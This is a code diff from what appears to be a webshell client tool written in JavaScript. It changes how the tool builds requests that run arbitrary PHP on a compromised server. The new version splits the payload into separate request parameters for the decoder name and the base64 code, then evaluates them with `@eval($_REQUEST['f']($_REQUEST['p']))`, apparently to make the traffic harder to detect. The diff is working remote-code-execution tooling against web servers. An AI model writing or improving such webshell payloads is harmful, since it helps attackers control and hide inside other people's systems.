@@ -87,7 +87,7 @@ export default {
     },
 
     async $genRequest(shell, code, codeParams = [], encode) {
-        console.log(codeParams)
+        console.log('codeParams:::', codeParams)
         shell.encode = 'UTF-8'
 
         if (shell.decodeType === CONST.DECODE_TYPE.NONE.VALUE) {
@@ -97,7 +97,7 @@ export default {
             code = code(CONST.DECODE_TYPE.BASE64[shell.type], ...codeParams)
         }
 
-        // code = `header("Content-Type: text/html;charset=${encode || shell.encode}");` + code
+        code = `header("Content-Type: text/html;charset=${encode || shell.encode}");` + code
 
         let params = {}
         if (shell.encodeType === CONST.ENCODE_TYPE.NONE) {
@@ -107,9 +107,9 @@ export default {
             let base64Str = crypto.base64Encode(code)
             console.log(base64Str)
             // base64Str = encodeURIComponent(base64Str)
-            // params = {f: 'base64_decode', p: base64Str}
-            // params[shell.pwd] = `@eval($_REQUEST['f']($_REQUEST['p']));`
-            params[shell.pwd] = `@eval(@base64_decode('${base64Str}'));`
+            params = {f: 'base64_decode', p: base64Str, r: code}
+            params[shell.pwd] = `@eval($_REQUEST['f']($_REQUEST['p']));`
+            // params[shell.pwd] = `@eval(@base64_decode('${base64Str}'));`
         }
 
         return new Promise(async (resolve, reject) => {
